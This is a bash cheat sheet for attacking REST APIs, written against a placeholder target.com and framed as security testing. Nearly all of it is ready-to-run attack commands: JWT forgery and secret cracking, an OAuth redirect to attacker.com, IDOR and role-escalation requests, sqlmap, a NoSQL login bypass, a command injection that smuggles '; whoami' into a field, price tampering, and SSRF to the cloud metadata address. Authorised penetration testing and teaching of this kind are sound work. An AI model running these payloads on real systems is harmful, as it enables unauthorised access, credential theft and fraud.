#!/bin/bash
# ==============================================
# ULTIMATE REST API SECURITY TESTING CHEAT SHEET
# ==============================================

# 1. RECONNAISSANCE
# -----------------

# Discover API endpoints
waybackurls target.com | grep "api" > api_endpoints.txt
gau target.com | grep -E "api/v[0-9]" >> api_endpoints.txt

# Identify API specs
curl -s https://api.target.com/swagger.json | jq
curl -s https://api.target.com/openapi.yaml

# Enumerate API parameters
arjun -u https://api.target.com/users -m GET -o api_params.txt

# 2. AUTHENTICATION TESTING
# -------------------------

# JWT Testing
# Check for none algorithm
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0..." https://api.target.com/user

# Crack JWT secret
john --wordlist=rockyou.txt jwt.txt
hashcat -m 16500 jwt.txt rockyou.txt

# OAuth Testing
curl -X POST "https://api.target.com/oauth/token" -d "client_id=CLIENT_ID&redirect_uri=https://attacker.com&grant_type=authorization_code"

# 3. COMMON VULNERABILITIES
# -------------------------

# IDOR Testing
curl -H "Authorization: Bearer valid_token" https://api.target.com/users/123
curl -H "Authorization: Bearer valid_token" https://api.target.com/users/124

# BOLA (Broken Object Level Authorization)
curl -X PUT -H "Authorization: Bearer user_token" -d '{"role":"admin"}' https://api.target.com/users/123

# Mass Assignment
curl -X POST -H "Content-Type: application/json" -d '{"email":"user@test.com","isAdmin":true}' https://api.target.com/users

# 4. INJECTION TESTING
# --------------------

# SQLi in API parameters
sqlmap -u "https://api.target.com/users?id=1" --risk=3 --level=5

# NoSQL Injection
curl -X POST -H "Content-Type: application/json" -d '{"username":{"$ne":""},"password":{"$ne":""}}' https://api.target.com/login

# Command Injection
curl -X POST -d '{"ip":"127.0.0.1; whoami"}' https://api.target.com/ping

# 5. BUSINESS LOGIC TESTING
# -------------------------

# Rate Limit Testing
for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" https://api.target.com/limited; done

# Price Manipulation
curl -X POST -H "Content-Type: application/json" -d '{"price":0.01,"item_id":123}' https://api.target.com/checkout

# 6. ADVANCED TECHNIQUES
# ----------------------

# GraphQL Testing
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://api.target.com/graphql

# Server-Side Request Forgery
curl -X POST -H "Content-Type: application/json" -d '{"url":"http://169.254.169.254/latest/meta-data"}' https://api.target.com/fetch

# 7. AUTOMATED TOOLS
# ------------------

# REST API Scanner
python3 restler.py --host https://api.target.com --spec openapi.json --token valid_token

# OWASP ZAP API Scan
zap-cli quick-scan -s api-scan -r report.html https://api.target.com

# Nuclei API Templates
nuclei -t ~/nuclei-templates/api/ -u https://api.target.com -o api_scan_results.txt

# 8. REPORTING
# ------------

# Generate HTML report
cat test_results.json | jq -r '. | map(select(.severity == "high"))' > high_findings.json

# ==============================================
# TIPS:
# 1. Always test with proper authorization
# 2. Check all HTTP methods (GET, POST, PUT, DELETE, PATCH)
# 3. Test with different content types (JSON, XML, Form-Data)
# 4. Verify error handling and information leakage
# ==============================================

# RECOMMENDED WORDLISTS:
# ----------------------
# /usr/share/wordlists/api/endpoints.txt
# /usr/share/wordlists/api/parameters.txt
# /usr/share/wordlists/jwt/secrets.txt